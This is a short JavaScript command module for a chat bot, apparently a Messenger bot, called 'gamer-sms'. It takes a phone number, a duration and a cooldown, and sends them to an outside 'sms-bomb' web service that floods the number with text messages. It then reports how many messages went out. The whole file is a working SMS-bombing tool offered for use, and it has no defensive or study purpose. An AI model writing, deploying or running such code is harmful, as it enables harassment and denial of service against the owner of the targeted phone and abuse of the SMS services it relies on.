const axios = require("axios");

module.exports.config = {
    name: "gamer-sms",
    version: "1.0.0",
    hasPermssion: 0,
    credits: "shiki",
    description: "Send a bombardment of SMS to a phone number",
    commandCategory: "Other",
    cooldowns: 5,
    dependencies: ["axios"]
};

module.exports.run = async function({ api, event, args }) {
    if (args.length !== 3) {
        api.sendMessage("Usage: .gamer-sms <phone_number> <duration> <cooldown>", event.threadID, event.messageID);
        return;
    }

    const phoneNumber = args[0];
    const duration = parseInt(args[1], 10);
    const cooldown = parseInt(args[2], 10);

    if (isNaN(duration) || duration <= 0) {
        api.sendMessage("The duration must be a positive number.", event.threadID, event.messageID);
        return;
    }

    if (isNaN(cooldown) || cooldown <= 0) {
        api.sendMessage("The cooldown must be a positive number.", event.threadID, event.messageID);
        return;
    }

    try {
        const response = await axios.get(`https://gamer-sms-bomb.onrender.com/bomb?number=${encodeURIComponent(phoneNumber)}&duration=${duration}&cooldown=${cooldown}`);
        
        if (response.data.status === "Process completed") {
            api.sendMessage(`SMS bombardment successful! ${response.data.success_count} messages sent.`, event.threadID, event.messageID);
        } else {
            api.sendMessage("An error occurred while sending SMS. Please try again later.", event.threadID, event.messageID);
        }
    } catch (error) {
        console.error('Error sending SMS:', error.message);
        api.sendMessage("Failed to send SMS. Please try again later.", event.threadID, event.messageID);
    }
};
